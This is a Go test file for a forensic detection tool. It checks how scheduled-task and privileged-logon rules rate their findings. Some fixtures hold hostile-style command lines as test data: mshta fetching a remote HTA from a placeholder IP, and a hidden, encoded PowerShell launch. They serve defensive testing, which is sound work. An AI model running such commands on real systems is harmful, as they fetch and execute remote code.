package detect

import (
	"strings"
	"testing"

	"tracefall/internal/model"
)

func taskEvent(id, name, user, cmdline, proc string) model.Event {
	return model.Event{ID: id, CaseID: "c", EventType: model.EventScheduledTaskCreate, User: user, ProcessName: proc, CommandLine: cmdline,
		Extra: map[string]string{"task_name": name}}
}

func TestNewScheduledTask_UndatedRegistrationIsNotPrintedAsYearOne(t *testing.T) {
	got := newScheduledTask{}.Evaluate([]model.Event{taskEvent("1", "ActionReview", "", `mshta.exe https://203.0.113.8/a.hta`, "mshta.exe")})
	if len(got) != 1 {
		t.Fatalf("got %d findings", len(got))
	}
	if strings.Contains(got[0].Description, "0001-01-01") {
		t.Errorf("an unrecorded date must not appear as a time: %s", got[0].Description)
	}
	if !strings.Contains(got[0].Description, "registration date is not recorded") {
		t.Errorf("description must say the date is not recorded: %s", got[0].Description)
	}
}

func TestNewScheduledTask_StockSystemDirectoryInterpreterIsNotHigh(t *testing.T) {
	stock := taskEvent("s", "Stock", "", `%windir%\system32\rundll32.exe aepdu.dll,AePduRunUpdate`, "rundll32.exe")
	stock2 := taskEvent("s2", "Stock2", "", `%systemroot%\system32\cscript.exe %systemroot%\system32\tool.vbs`, "cscript.exe")
	hostile := taskEvent("h", "Hostile", "", `powershell.exe -nop -w hidden -enc SQBFAFgA`, "powershell.exe")
	remote := taskEvent("r", "Remote", "", `mshta.exe http://203.0.113.9/a.hta`, "mshta.exe")
	temp := taskEvent("t", "Temp", "", `C:\Users\alice\AppData\Local\Temp\x.exe`, "x.exe")
	sev := map[string]string{}
	for _, f := range (newScheduledTask{}).Evaluate([]model.Event{stock, stock2, hostile, remote, temp}) {
		sev[f.SupportingEvents[0]] = f.Severity
	}
	for _, id := range []string{"s", "s2"} {
		if sev[id] == model.SeverityHigh {
			t.Errorf("%s: a stock system-directory task action must not be high", id)
		}
	}
	for _, id := range []string{"h", "r"} {
		if sev[id] != model.SeverityHigh {
			t.Errorf("%s: severity %q, want high", id, sev[id])
		}
	}
	// A writable executable alone remains a lead, not a high-severity verdict.
	if sev["t"] != model.SeverityMedium {
		t.Errorf("writable target alone: severity %q, want medium", sev["t"])
	}
}

func TestPrivilegedLogon_UnknownHostsAreNotMergedAcrossCollections(t *testing.T) {
	a := privEvent("a", "", "alice", mustTime("2026-01-15T09:00:00Z"), "0x1")
	a.CollectionID = "col1"
	b := privEvent("b", "", "alice", mustTime("2026-01-15T10:00:00Z"), "0x2")
	b.CollectionID = "col2"
	if got := (privilegedLogonObserved{}).Evaluate([]model.Event{a, b}); len(got) != 2 {
		t.Fatalf("got %d findings, want 2: an unrecorded host is not a shared host", len(got))
	}
}
